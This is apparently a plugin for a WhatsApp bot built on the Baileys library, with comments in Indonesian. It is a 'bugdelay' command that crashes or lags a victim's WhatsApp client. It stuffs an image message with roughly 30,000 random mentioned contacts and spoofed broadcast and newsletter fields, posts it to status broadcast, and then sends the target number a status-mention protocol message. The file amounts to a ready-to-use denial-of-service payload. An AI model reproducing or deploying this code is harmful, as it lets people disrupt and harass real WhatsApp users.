// 📝 plugin bug - bugdelay

// 📝 plugin bug - bugdelay

const { generateWAMessage } = require('@whiskeysockets/baileys');
const axios = require('axios');

// Ambil gambar valid
const getImageBuffer = async () => {
  const res = await axios.get('https://files.catbox.moe/2t6m0g.jpeg', { responseType: 'arraybuffer' });
  return Buffer.from(res.data);
};

async function sendBugDelayOnce(client, target, mention) {
  const buffer = await getImageBuffer();

  const msg = await generateWAMessage(target, {
    image: buffer,
    caption: "𐌕𐌀𐌌𐌀 ✦ 𐌂𐍉𐌍𐌂𐌖𐌄𐍂𐍂𐍉𐍂"
  }, {
    upload: client.waUploadToServer
  });

  const type = Object.keys(msg.message).find(t => t.endsWith('Message'));

  // Suntik contextInfo lag tinggi
  msg.message[type].contextInfo = {
    mentionedJid: [
      "13135550002@s.whatsapp.net",
      ...Array.from({ length: 30000 }, () =>
        `1${Math.floor(Math.random() * 999999)}@s.whatsapp.net`
      )
    ],
    participant: "0@s.whatsapp.net",
    remoteJid: "status@broadcast",
    forwardedNewsletterMessageInfo: {
      newsletterName: "⚠️ WA Delay Zone",
      newsletterJid: "0@newsletter",
      serverMessageId: 1
    }
  };

  // Kirim satu kali ke status broadcast (efek delay)
  const sentMsg = await client.relayMessage("status@broadcast", msg.message, {});

  // Mention langsung (efek berat saat dibuka)
  if (mention) {
    await client.relayMessage(target, {
      statusMentionMessage: {
        message: {
          protocolMessage: {
            key: sentMsg.key,
            type: 25
          }
        }
      }
    });
  }
}

let handler = async (m, { conn, text, command }) => {
  if (!text) return m.reply(`Contoh:\n*${command} 62xxxxxxxxxx*`);
  const target = text.replace(/\D/g, '') + '@s.whatsapp.net';
  await sendBugDelayOnce(conn, target, true);
  m.reply('✅ Bug Delay (1x Kirim) berhasil dikirim ke: ' + target);
};

handler.command = /^bugdelay$/i;
handler.tags = ['bug'];
handler.help = ['bugdelay <nomor>'];
handler.owner = true

module.exports = handler;